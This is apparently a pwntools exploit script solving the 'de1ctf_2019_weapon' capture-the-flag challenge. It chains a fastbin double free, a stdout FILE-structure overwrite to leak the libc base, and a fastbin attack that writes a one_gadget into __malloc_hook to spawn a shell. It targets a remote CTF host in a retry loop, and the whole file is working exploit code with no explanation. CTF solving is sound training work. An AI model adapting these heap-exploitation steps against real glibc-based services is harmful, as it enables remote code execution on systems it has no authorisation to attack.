#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

'''
if(sys.argv[1] == 'l'):
	p = process("./de1ctf_2019_weapon")
	elf = ELF("./de1ctf_2019_weapon")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
	p = remote()
	elf = ELF("./de1ctf_2019_weapon")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
'''

def menu(cmd):
    sla("choice >> \n",str(cmd))

def add(idx,size,name):
    menu(1)
    sla("weapon: ",str(size))
    sla("index: ",str(idx))
    sla("your name:",name)

def delete(idx):
    menu(2)
    sla("idx :",str(idx))

def rename(idx,name):
    menu(3)
    sla("input idx: ",str(idx))
    sda("new content:\n",name)

def exploit():

    ###leak libc###
    add(0,0x10,'AAAAAAA')
    add(1,0x10,'BBBBBBB')
    add(2,0x60,'CCCCCCC')
    add(3,0x10,'DDDDDDD')

    delete(0)
    delete(1)
    delete(0)

    payload = p64(0) + p64(0x21)
    add(0,0x10,payload)

    rename(1,'\x10')
    add(1,0x10,'BBBBBBBB')

    payload = p64(0) + p64(0x91)
    add(4,0x10,payload)
    delete(1)
    delete(2)

    add(1,0x10,'BBBBBBB')
    rename(2,'\xdd'+'\x65')

    add(5,0x60,'AAAAA')
    payload = 'A' * 0x33 + p64(0xfbad1887) + p64(0) * 3 + '\0'
    add(6,0x60,payload)
    rename(6,payload)
    
    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3c5600
    success(hex(libc_base))
    pause()

    ###fastbin attack###
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    realloc = libc_base + libc.symbols['__libc_realloc']
    one_gadget = libc_base + 0xf1147

    add(7,0x60,'AAAAA')
    delete(7)
    rename(7,p64(malloc_hook-0x23))

    add(2,0x60,'AAAAA')
    #payload = 'A' * (0x13-0x8) + p64(one_gadget) + p64(realloc)
    payload = 'A' * (0x13) + p64(one_gadget)
    add(8,0x60,payload)
    rename(8,payload)

    ###get shell###
    menu(1)
    sla("weapon: ",str(0x30))
    sla("index: ",'9')
    


while True:
    elf = ELF("./de1ctf_2019_weapon")
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    try:
        global p
        #p = process("./de1ctf_2019_weapon")
        p = remote('node3.buuoj.cn',25697)
        exploit()
        ia()
    except:
        p.close()
